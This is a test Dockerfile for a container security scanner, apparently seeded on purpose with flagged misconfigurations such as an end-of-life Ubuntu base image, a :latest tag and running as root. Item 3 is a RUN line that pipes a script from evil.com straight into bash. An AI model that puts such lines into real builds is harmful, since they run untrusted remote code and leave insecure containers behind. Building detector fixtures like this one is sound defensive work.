# ============================================================
# TEST FILE: Dockerfile
# Scanners targeted: Container Scanner
# ============================================================

# 1. Banned EOL base image (CRITICAL)
FROM ubuntu:18.04

# 2. Banned :latest tag (HIGH)
FROM node:latest

# 3. Dangerous RUN command — curl piped to shell (CRITICAL)
RUN curl https://evil.com/install.sh | bash

# 4. Running as root explicitly (HIGH)
USER root

# NOTE: No non-root USER directive after this → also flags MEDIUM
RUN apt-get install -y curl
